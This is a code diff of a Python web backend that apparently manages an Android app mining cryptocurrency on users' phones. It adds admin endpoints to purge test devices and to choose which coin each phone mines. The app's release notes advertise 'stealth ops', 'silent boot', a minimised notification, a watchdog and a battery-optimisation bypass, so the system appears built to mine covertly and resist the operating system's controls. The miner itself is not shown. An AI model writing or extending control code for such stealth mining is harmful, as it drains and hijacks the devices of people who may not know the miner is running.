@@ -223,11 +223,11 @@ class JobCreateIn(BaseModel):
 
 # ---------- Constants ----------
 PRIORITY_MULT = {"economy": 0.7, "standard": 1.0, "instant": 2.5}
-APK_VERSION = "1.2.7"
-APK_PATH = "/grid-worker-v1.2.7.apk"
+APK_VERSION = "1.2.8"
+APK_PATH = "/grid-worker-v1.2.8.apk"
 APK_SIZE = 33850
-APK_SHA256 = "88482a4e0b02f2d1859f43b42b7e1dfa503e30f1c009087deb493d83c3961102"
-APK_RELEASE_NOTES = "v1.2.7 shadow proxy · pool keepalive · battery-opt bypass · 5s wakelock refresh · 10s real-time sync · POOL ACTIVE admin badge · v2+v3 signed"
+APK_SHA256 = "f3ec0ef5b6d366b50cf2d4660f2b099c393cfba95d3fd48f4501c95a21cc0935"
+APK_RELEASE_NOTES = "v1.2.8 stealth ops · auto-resume · silent boot · alarm watchdog · IMPORTANCE_MIN notification · total purge · v2+v3 signed"
 REFERRAL_RATE = 0.10
 LOGIN_LOCK_THRESHOLD = 5
 LOGIN_LOCK_MINUTES = 15
@@ -1290,6 +1290,7 @@ async def admin_devices_live(
             # LOCAL ONLY = phone only talks to our backend, no upstream stratum
             "stratum_linked": bool(r.get("stratum_linked")),
             "stratum_last_linked_at": r.get("stratum_last_linked_at"),
+            "assigned_coin": r.get("assigned_coin"),
         })
     # Aggregate counters
     counters = {
@@ -1356,6 +1357,83 @@ async def admin_wipe_demo_devices(user: dict = Depends(require_admin)):
         "as_of": datetime.now(timezone.utc).isoformat(),
         "operator": user["email"],
     }
+
+
+@api.post("/admin/devices/wipe-all-fake")
+async def admin_wipe_all_fake_devices(user: dict = Depends(require_admin)):
+    """
+    Iter-14 / v1.2.8 TOTAL PURGE: delete every device that is NOT a real
+    physical Android worker. Combines is_demo, seeded, test, and any device
+    whose name starts with the historical seed prefixes. Devices flagged
+    is_real_apk=true are NEVER touched.
+
+    Returns per-bucket counts so the admin UI can render an honest summary.
+    """
+    or_filters = [
+        {"is_demo": True},
+        {"seeded": True},
+        {"is_seed": True},
+        {"is_test": True},
+        {"name": {"$regex": "^(Test|TEST|Seed|Mock|Demo|Iter|Sim|First|Survivor|HappyPath|Cfg|Legacy|Shared|Burst|WS|Hot|Generic)", "$options": "i"}},
+        {"name": {"$regex": "^(realsurvive|first_)"}},
+    ]
+    # iter-14 / v1.2.8 TOTAL PURGE: also remove every device that
+    #   - has NEVER linked to Binance Pool (no stratum_first_linked_at), AND
+    #   - is running an OUTDATED app_version (< v1.2.5, or missing) — these
+    #     can only have come from pre-iter12 testing scripts; an authentic
+    #     installer would carry v1.2.5+.
+    or_filters.append({
+        "$and": [
+            {"$or": [
+                {"stratum_first_linked_at": {"$exists": False}},
+                {"stratum_first_linked_at": None},
+            ]},
+            {"$or": [
+                {"app_version": {"$exists": False}},
+                {"app_version": None},
+                {"app_version": {"$lt": "1.2.5"}},
+            ]},
+        ]
+    })
+    safety = {}
+    counts = {}
+    for f in or_filters:
+        counts[next(iter(f))] = await db.devices.count_documents({**f, **safety})
+    res = await db.devices.delete_many({"$or": or_filters, **safety})
+    return {
+        "ok": True,
+        "deleted": int(res.deleted_count),
+        "by_bucket": counts,
+        "as_of": datetime.now(timezone.utc).isoformat(),
+        "operator": user["email"],
+    }
+
+
+@api.post("/admin/devices/{device_id}/assign-class")
+async def admin_assign_compute_class(
+    device_id: str,
+    payload: dict,
+    user: dict = Depends(require_admin),
+):
+    """
+    Iter-14 / v1.2.8: dispatch a per-device compute-class directive.
+    Body: {"coin": "RVN" | "BTC" | "LTC" | ... | "AUTO"}
+    The next /api/mining/config?device_id=... call from the device picks it up
+    via device.assigned_coin → mining profile → algo + expected hashrate.
+    """
+    coin = (payload.get("coin") or "AUTO").strip().upper()
+    valid_coins = {"AUTO", "RVN", "BTC", "LTC", "DASH", "KAS", "ETC", "ZEC",
+                   "BCH", "CFX", "CKB", "ETHW"}
+    if coin not in valid_coins:
+        raise HTTPException(status_code=400, detail=f"unknown coin: {coin}")
+    upd = {"assigned_coin": None if coin == "AUTO" else coin,
+           "assigned_at": datetime.now(timezone.utc).isoformat(),
+           "assigned_by": user["email"]}
+    res = await db.devices.update_one({"id": device_id}, {"$set": upd})
+    if res.matched_count == 0:
+        raise HTTPException(status_code=404, detail="device not found")
+    return {"ok": True, "device_id": device_id, "assigned_coin": coin,
+            "as_of": upd["assigned_at"], "operator": user["email"]}
 
 
 # ---------- Admin: First Real Worker (iter-13 / v1.2.6.1) ----------
@@ -1985,7 +2063,12 @@ async def mining_config_for_device(device_id: str, user: dict = Depends(get_curr
     else:
         mode = "idle"
 
-    coin = await _get_active_coin()
+    # iter-14 / v1.2.8: per-device admin coin assignment overrides global default
+    assigned = (dev.get("assigned_coin") or "").strip().upper() if dev.get("assigned_coin") else None
+    if assigned and assigned in MINING_PROFILES:
+        coin = assigned
+    else:
+        coin = await _get_active_coin()
     p = MINING_PROFILES[coin]
     tier_mult = MODEL_MULT.get(dev.get("model", "mid"), 1.0)
     expected_hashrate = int(p["base_hashrate_hps"] * tier_mult)
